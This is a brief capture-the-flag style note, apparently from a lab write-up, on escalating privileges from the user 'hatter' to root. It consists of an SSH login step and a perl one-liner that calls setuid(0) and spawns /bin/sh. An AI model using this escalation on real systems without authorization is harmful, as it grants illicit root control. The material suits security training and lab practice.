Privesc hatter to root
1. ssh as hatter using hatters password (NOTE: you NEED to be fully logged in as hatter to run perl)
2. `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
